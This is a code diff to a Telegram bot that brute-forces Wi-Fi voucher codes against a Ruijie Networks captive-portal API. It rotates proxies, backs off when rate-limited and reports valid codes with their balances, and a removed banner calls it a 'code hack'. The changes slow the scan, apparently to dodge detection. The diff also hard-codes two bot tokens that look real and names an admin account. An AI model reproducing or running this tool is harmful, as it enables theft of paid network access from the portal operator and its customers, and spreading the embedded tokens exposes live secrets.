@@ -23,11 +23,11 @@ from telegram.ext import Application, ContextTypes, CommandHandler, CallbackQuer
 nest_asyncio.apply()
 
 # ── CONFIGURATION ──────────────────────────────────────────────────────────
-MAX_CONCURRENT = 200
-CONNECTION_LIMIT = 200
+MAX_CONCURRENT = 1   # တစ်ကြိမ်လျှင် ၁ ခုတည်းဖြင့် အေးဆေးမှန်ကန်စွာ စစ်ဆေးမည်
+CONNECTION_LIMIT = 5
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
-TOKEN = "8631397862:AAHJn7iBZ-iqVy9ZhGavdjvRgzkWFzNwlNY"
+TOKEN = "8631397862:AAFfaQ2tCflZfunAQEvyG3c_RfCUlKE69lw"
 
 # Proxy List
 PROXY_LIST = [
@@ -156,12 +156,12 @@ def code_generator(mode):
         codes = [str(i).zfill(9) for i in range(1000000000)]
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(1000000)]
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(1000000)]
     else:
-        codes = [str(i).zfill(6) for i in range(10000000000000000000)]
+        codes = [str(i).zfill(6) for i in range(1000000)]
 
     random.shuffle(codes)
     for code in codes:
@@ -172,7 +172,7 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
     context_data['current_code'] = code
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     session_id = None
-    timeout = aiohttp.ClientTimeout(total=10, connect=3)
+    timeout = aiohttp.ClientTimeout(total=8, connect=2)
     
     proxy = next(proxy_pool) if proxy_pool else None
 
@@ -194,10 +194,14 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=8) as req:
+                
+                # အလွန်အကျွံ မဖြစ်စေရန် ခဏစောင့်ပေးခြင်း
+                await asyncio.sleep(1.0)
+
+                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
+                        context_data['retry_total'] += 1; await asyncio.sleep(2.0); continue
                     if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
@@ -244,25 +248,18 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
 
     try:
         while not context.user_data.get('scan_stop', False):
-            tasks = []
-            for _ in range(MAX_CONCURRENT):
-                if context.user_data.get('scan_stop', False): break
-                try:
-                    code = next(code_gen)
-                    tasks.append(perform_check_silent(code, query.message.chat, session_url, connector, context.user_data))
-                    context.user_data['checked_total'] += 1
-                except StopIteration:
-                    context.user_data['scan_stop'] = True
-                    break
-            if not tasks: break
+            code = next(code_gen, None)
+            if not code:
+                context.user_data['scan_stop'] = True
+                break
 
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(0.01)
+            context.user_data['checked_total'] += 1
+            await perform_check_silent(code, query.message.chat, session_url, connector, context.user_data)
+
             if context.user_data.get('scan_stop', False): break
 
-            # Telegram Rate Limit မမိစေရန် ၁ စက္ကန့်မှ တစ်ကြိမ်သာ edit_text လုပ်မည်
             current_time = time.time()
-            if current_time - last_edit_time < 1.0:
+            if current_time - last_edit_time < 2.0:
                 continue
             last_edit_time = current_time
 
@@ -284,17 +281,16 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
                 hits_text = "\n🔥 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
 
             text = (
-                f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
-                f"{session_url}\n"
                 f"⚡ **Scanner Running** ⚡\n"
+                f"━━━━━━━━━━━━━━━━━━━\n"
                 f"🏹 Tried: {checked_total:,}\n"
-                f"🎯 Current Code: {current_code}\n"
+                f"🎯 Current Code: `{current_code}`\n"
                 f"⚔️ Hits: {hits}\n"
-                f"🗡️ Expired: {expired}\n"
+                f"🗡️ Expired: {expired:,}\n"
                 f"⚠️ Limits: {retry_total}\n"
                 f"⚡ Speed: {speed_cm:.1f} c/m\n"
-                f"🔀 Proxies: {proxy_status}\n\n"
-                f"───────────────────────────────"
+                f"🔀 Proxies: {proxy_status}\n"
+                f"━━━━━━━━━━━━━━━━━━━"
                 f"{hits_text}"
             )
             try:
@@ -310,7 +306,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
         hits_count = context.user_data.get('hits', 0)
         checked_count = context.user_data.get('checked_total', 0)
         try:
-            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ。\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
 
